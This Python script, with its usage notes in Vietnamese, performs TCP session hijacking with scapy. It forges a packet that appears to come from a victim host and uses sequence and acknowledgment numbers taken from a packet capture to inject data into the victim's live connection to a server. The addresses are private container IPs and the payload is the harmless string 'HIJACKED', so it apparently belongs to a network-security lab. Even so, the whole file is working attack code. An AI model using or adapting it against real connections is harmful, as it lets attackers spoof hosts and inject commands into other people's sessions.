#!/usr/bin/env python3
"""Chen goi tin gia mao vao phien TCP victim -> server.
Can doc so SEQ/ACK tu capture (tcpdump -nn -r ~/session.pcap) roi truyen vao.
Chay tren container attacker (can root):
  sudo python3 hijack.py <seq> <ack> <sport>
Trong do <seq> = so sequence tiep theo cua victim,
<ack> = so acknowledgment hien tai, <sport> = cong nguon cua victim.

Vi du: sudo python3 hijack.py 1234567 7654321 45678"""

import sys
from scapy.all import IP, TCP, send

VICTIM = '172.21.0.2'
SERVER = '172.21.0.3'
DPORT = 9999
PAYLOAD = b'HIJACKED\n'

def main():
    if len(sys.argv) != 4:
        print('Dung: sudo python3 hijack.py <seq> <ack> <sport>')
        sys.exit(2)
    seq, ack, sport = int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3])
    pkt = (IP(src=VICTIM, dst=SERVER)
           / TCP(sport=sport, dport=DPORT, flags='PA', seq=seq, ack=ack)
           / PAYLOAD)
    send(pkt, verbose=False)
    print('Da chen "%s" seq=%d ack=%d sport=%d' % (PAYLOAD.decode().strip(), seq, ack, sport))

if __name__ == '__main__':
    main()
